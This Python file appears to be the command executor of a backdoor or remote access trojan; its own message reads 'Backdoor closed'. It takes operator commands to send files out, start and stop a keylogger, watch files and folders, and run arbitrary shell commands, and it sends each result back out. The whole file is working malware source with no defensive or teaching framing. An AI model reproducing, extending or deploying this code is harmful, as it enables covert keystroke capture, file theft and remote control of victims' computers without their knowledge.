import helpers
import socket, os, sys, time, subprocess
from fileUtils import FileTransfer, FileMonitor
from keylog import Keylogger

class CommandExecutor(object):
    def __init__(self):
        self.savedFile = "result.txt"

        self.fileTransfer = FileTransfer()
        self.keylogger = Keylogger()
        self.fileMonitor = FileMonitor()

    def execute(self, cmd):
        print("Executing command: {}".format(cmd))
        result = ""
        if cmd[:3] == 'cd ':
            try:
                helpers.cd(cmd[3:])
            except OSError as e:
                result = str(e)

        elif cmd[:4] == 'GET ':
            filename = cmd[4:]
            if not os.path.exists(filename):
                result = "File doesn't exist\n"
            else:
                self.fileTransfer.sendFile(filename)

        elif cmd[:5] == 'KEYON':
            if self.keylogger.start():
                result = "Started keylogger\n"
            else:
                result = "Keylogger started already\n"

        elif cmd[:6] == 'KEYOFF':
            if self.keylogger.stop():
                result = "Stopped keylogger\n"
            else:
                result = "Keylogger already stopped\n"

        elif cmd[:6] == 'WATCH ':
            self.addWatch(cmd[6:])
            result = "Added watch\n"

        elif cmd[:8] == 'RMWATCH ':
            if self.removeWatch(cmd[8:]):
                result = "Removed watch\n"
            else:
                result = "File or directory don't have watch\n"

        elif cmd[:5] == 'CLOSE':
            print("Backdoor closed...\n")
            sys.exit(0)
        else:
            result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result = result.stdout.read() + result.stderr.read()

        if result != "":
            print("Result: %s" % result)
            self.saveResult(result)
        time.sleep(0.1)

    def addWatch(self, path):
        try:
            dir, filename = path.split(',')
        except ValueError:
            dir = path
            filename = None

        self.fileMonitor.addWatch(dir, filename=filename)

    def removeWatch(self, path):
        return self.fileMonitor.removeWatch(path)

    def saveResult(self, data):
        with open(self.savedFile, "wb") as savedFile:
            savedFile.write(data)
        self.fileTransfer.sendFile(self.savedFile)
